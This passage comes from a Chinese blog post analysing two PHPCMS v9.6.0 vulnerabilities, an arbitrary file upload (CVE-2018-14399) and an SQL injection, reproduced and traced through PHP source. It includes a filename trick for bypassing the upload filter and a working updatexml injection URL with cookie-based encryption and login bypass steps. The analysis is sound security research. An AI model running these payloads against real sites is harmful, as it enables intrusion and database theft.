class="variable">$remotefileurls</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$file</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(strpos(<span class="variable">$file</span>, <span class="string">&#x27;://&#x27;</span>) === <span class="literal">false</span> || strpos(<span class="variable">$file</span>, <span class="variable">$upload_url</span>) !== <span class="literal">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">			<span class="variable">$filename</span> = fileext(<span class="variable">$file</span>);</span><br><span class="line">			<span class="variable">$file_name</span> = basename(<span class="variable">$file</span>);</span><br><span class="line">			<span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">			<span class="variable">$newfile</span> = <span class="variable">$uploaddir</span>.<span class="variable">$filename</span>;</span><br><span class="line">			<span class="variable">$upload_func</span> = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$upload_func</span>(<span class="variable">$file</span>, <span class="variable">$newfile</span>)) &#123;</span><br><span class="line">				<span class="variable">$oldpath</span>[] = <span class="variable">$k</span>;</span><br><span class="line">				<span class="variable">$GLOBALS</span>[<span class="string">&#x27;downloadfiles&#x27;</span>][] = <span class="variable">$newpath</span>[] = <span class="variable">$uploadpath</span>.<span class="variable">$filename</span>;</span><br><span class="line">				@chmod(<span class="variable">$newfile</span>, <span class="number">0777</span>);</span><br><span class="line">				<span class="variable">$fileext</span> = fileext(<span class="variable">$filename</span>);</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$watermark</span>)&#123;</span><br><span class="line">					watermark(<span class="variable">$newfile</span>, <span class="variable">$newfile</span>,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$filepath</span> = <span class="variable">$dir</span>.<span class="variable">$filename</span>;</span><br><span class="line">				<span class="variable">$downloadedfile</span> = <span class="keyword">array</span>(<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$filename</span>, <span class="string">&#x27;filepath&#x27;</span>=&gt;<span class="variable">$filepath</span>, <span class="string">&#x27;filesize&#x27;</span>=&gt;filesize(<span class="variable">$newfile</span>), <span class="string">&#x27;fileext&#x27;</span>=&gt;<span class="variable">$fileext</span>);</span><br><span class="line">				<span class="variable">$aid</span> = <span class="keyword">$this</span>-&gt;add(<span class="variable">$downloadedfile</span>);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;downloadedfiles[<span class="variable">$aid</span>] = <span class="variable">$filepath</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> str_replace(<span class="variable">$oldpath</span>, <span class="variable">$newpath</span>, <span class="variable">$value</span>);</span><br><span class="line">	&#125;	</span><br></pre></td></tr></table></figure>
+
+<p>首先限制了其中 <code>$ext</code> 只允许为<code>gif|jpg|jpeg|bmp|png</code> </p>
+<p>153行 进行了一个过滤</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">&quot;/(href|src)=([\&quot;|&#x27;]?)([^ \&quot;&#x27;&gt;]+\.(<span class="subst">$ext</span>))\\2/i&quot;</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) <span class="keyword">return</span> <span class="variable">$value</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里匹配了<code>src</code>或<code>href</code>中文件的文件名，不过后缀为<code>$ext</code>，其中<code>$ext</code>的值为：<code>gif|jpg|jpeg|bmp|png</code></p>
+<p><code>http://ip/p2hm1n.php#a.jpg</code> 即可绕过正则</p>
+<p>158行 使用了 <code>fillurl</code> 函数远程加载资源，还吧 # 之后的字符全部移除</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pos</span> = strpos(<span class="variable">$surl</span>,<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pos</span>&gt;<span class="number">0</span>) <span class="variable">$surl</span> = substr(<span class="variable">$surl</span>,<span class="number">0</span>,<span class="variable">$pos</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>P2hm1n.php#a.jpg</code> 会被处理成 <code>P2hm1n.php </code></p>
+<p>之后调用 <code>download</code> 方法。程序直接调用 <code>copy</code> 函数将远程文件复制到本地</p>
+<h2 id="wap模块-SQL注入"><a href="#wap模块-SQL注入" class="headerlink" title="wap模块 SQL注入"></a>wap模块 SQL注入</h2><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问 <code>http://phpcms/index.php?m=wap&amp;a=index&amp;siteid=1</code></p>
+<blockquote>
+<p>PS: 默认安装是不具备war模块的，跟进后台看了一下，好像跟手机门户网站有关，但其实并不影响漏洞的利用</p>
+</blockquote>
+<p>直接发包至 repeater 模块。<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/qFr95yWlGcEsjZM-20201117115108047.jpg"></p>
+<p>将返回的 <code>Set-Cookie</code> 中<code>TVAUD_siteid</code>值附值给 <code>userid_flash</code>变量<br>因此 <code>userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY</code></p>
+<p>访问 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/phpcms/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br></pre></td></tr></table></figure>
+
+<p>并 POST 传参 <code>userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY</code><br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VSoJDEBZkU7Fsw8-20201117115108185.jpg"></p>
+<p>将返回的 <code>Set-Cookie</code> 中<code>TVAUD_att_json</code>值附值给 <code>a_k</code>参数</p>
+<p>GET型访问 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://phpcms/index.php?m=content&amp;c=down&amp;a_k=4639DgUMpurTOZjooOJq4TX6Y0Q_XVqujouwKcrfLTvAEJjgOjGhm4VLN5AZ3CQkIcSOFCoDh8V7NVmGuVvN6hrYV59KmsRC0SO-V_b6hLXhJxDw4DuOEQ1KS2RPKSae8keEN8PbbTo7fICqQnhDpFhUN5JSRgScbgnQggVE7d56earVmPST9Lw</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3fuanq7rCEoSyOZ-20201117115108205.jpg"></p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞触发点在 <code>phpcms/modules/content/down.php</code> 的 <code>init()</code> 函数<br>12 行 GET方式传入 <code>a_k</code>参数<br>14 行 根据 <code>DECODE</code> 判断其 <code>sys_auth</code> 为一个解密函数。直接证明——》<code>a_k</code>参数之前是经过加密的。这个解密流程其实很长，我们其实不用去看它的一个解密流程。<br>17 行 使用 <code>parse_str()</code> 函数处理 。  <code>parse_str()</code> 函数会自动对传入的值将其根据<code>&amp;</code>分割，然后解析到具体变量并注册变量，并且对内容进行URL解码操作。<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Y36mPkxv12pZhlM-20201117115108098.jpg"><br>26 行 引用未注册变量 <code>array(‘id’=&gt;$id)</code> ，但这里的<code>id</code>可以从<code>parse_str</code>函数处理<code>$a_k</code>后得到。且调用 <code>get_one</code> 方法。</p>
+<p><code>get_one</code>方法定义点在  <code>/phpcms/libs/classes/model.class.php</code> 73-76行。跟进发现这里的 <code>get_one</code> 方法其实就是 SQL 查询。且用到了 <code>sqls</code> 方法。<br>跟进 <code>sqls</code> 方法，这里是对数组参数的一个处理过程。<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VzLkrIoPJFl15Di-20201117115108399.jpg"><br>且从头到位都没有对<code>$id</code> 参数进行过滤处理。因此存在 sql 注入漏洞</p>
+<p>现在我们根据 从<code>parse_str</code>函数处理<code>$a_k</code>后得到的 <code>id</code> 推断出了存在 sql注入。但是由于之前我们推断中忽略的是一个解密流程。因此其实我们需要找到带有 sql注入payload 经过一次加密之后的 payload。</p>
+<p><strong>核心目的：构造加密后的 <code>$a_k</code> 变量</strong></p>
+<p><strong>思路一：伪造加密过程：直接对应源码中加密代码，进行本地加解密。</strong><br>产生问题：源码中对应的 auth_key 值来自服务器。且每个站点这个 auth_key 可能不一样。</p>
+<p><strong>思路二：寻找源码中调用此加密的地方。且可回显加密后代码</strong><br>方法： 全局搜索 sys_auth 。<br><code>phpcms\libs\classes\param.class.php</code> 中存在 <code>set_cookie</code> 方法<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5BUeGSb2Oyzhqj4-20201117115108323.jpg"><br>寻找哪里没有过滤sql注入的传入点。且可通过 cookie 加密获得加密后 payload<br>关键点：<code>phpcms/modules/attachment/attachments.php</code> 的 <code>swfupload_json</code> 方法。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$arr</span>[<span class="string">&#x27;aid&#x27;</span>] = intval(<span class="variable">$_GET</span>[<span class="string">&#x27;aid&#x27;</span>]);</span><br><span class="line">	<span class="variable">$arr</span>[<span class="string">&#x27;src&#x27;</span>] = safe_replace(trim(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]));</span><br><span class="line">	<span class="variable">$arr</span>[<span class="string">&#x27;filename&#x27;</span>] = urlencode(safe_replace(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]));</span><br><span class="line">	<span class="variable">$json_str</span> = json_encode(<span class="variable">$arr</span>);</span><br><span class="line">	<span class="variable">$att_arr_exist</span> = param::get_cookie(<span class="string">&#x27;att_json&#x27;</span>);</span><br><span class="line">	<span class="variable">$att_arr_exist_tmp</span> = explode(<span class="string">&#x27;||&#x27;</span>, <span class="variable">$att_arr_exist</span>);</span><br><span class="line">	<span class="keyword">if</span>(is_array(<span class="variable">$att_arr_exist_tmp</span>) &amp;&amp; in_array(<span class="variable">$json_str</span>, <span class="variable">$att_arr_exist_tmp</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$json_str</span> = <span class="variable">$att_arr_exist</span> ? <span class="variable">$att_arr_exist</span>.<span class="string">&#x27;||&#x27;</span>.<span class="variable">$json_str</span> : <span class="variable">$json_str</span>;</span><br><span class="line">		param::set_cookie(<span class="string">&#x27;att_json&#x27;</span>,<span class="variable">$json_str</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;			</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过 GET 传入三个参数，第一个参数 <code>aid</code> 经过了 <code>intval</code> 函数处理，那么不太适合通过此处传入payload。第二个参数 <code>src</code> 经过了 <code>safe_replace</code>处理。第三个 <code>filename</code> 通过 <code>safe_replace</code> 和 一次url 编码处理。之后做 <code>json_encode</code> 的操作，最终再调用 <code>set_cookie</code> 方法。<br>跟进一下 <code>safe_replace</code> 方法，发现是通过 <code>str_replace</code> 进行处理，且没有通过循环遍历来过滤，它只执行一次。那么两两组合一下，然后替换，从而达到 bypass 的效果。<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fdxGa6P3iTprsV2-20201117115108325.jpg"></p>
+<p>但是在触发  <code>set_cookie</code> 的 <code>swfupload_json</code> 方法，之前有一定的条件。<br>在<code>phpcms/modules/attachment/attachments.php</code>第十行的 <code>attachments</code> 类。其中 <code>__construct</code> 方法，相当于做类的初始化工作。其中有用户登录状态检测。21行限制 <code>$this→userid</code> 不能为空，否则跳转到登录界面<br>17 行 程序并没有检查 <code>$this-&gt;userid</code> 的有效性，所以只要传入的 <code>userid_flash</code> 是加密值就能够解密就可以通过检测。<br>获取 <code>userid_flash</code>加密值：在<code>phpcms/modules/wap/index.php</code> 文件。通过 cookie 获取 <code>$_GET[‘siteid’]</code> 加密后的数据，然后再作为 <code>$_POST[‘userid_flash’]</code> 的值，即可绕过登录检测。</p>
+<p>参考文章</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/">https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/</a><br><a target="_blank" rel="noopener" href="https://www.hackersb.cn/hacker/219.html">https://www.hackersb.cn/hacker/219.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/202914.html">https://www.freebuf.com/articles/web/202914.html</a><br><a target="_blank" rel="noopener" href="http://blog.nsfocus.net/phpcms-v9-6-content-module-sql-injection-vulnerability-analysis/">http://blog.nsfocus.net/phpcms-v9-6-content-module-sql-injection-vulnerability-analysis/</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88CVE-2018-14399%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">任意文件上传（CVE-2018-14399）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wap%E6%A8%A1%E5%9D%97-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">wap模块 SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHPCMS v9.6.0 两个漏洞分析&body=Check out this article: http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=PHPCMS v9.6.0 两个漏洞分析&description=&lt;p&gt;任意文件上传（CVE-2018-14399） + wap模块 SQL注入&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=PHPCMS v9.6.0 两个漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2021 M13n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
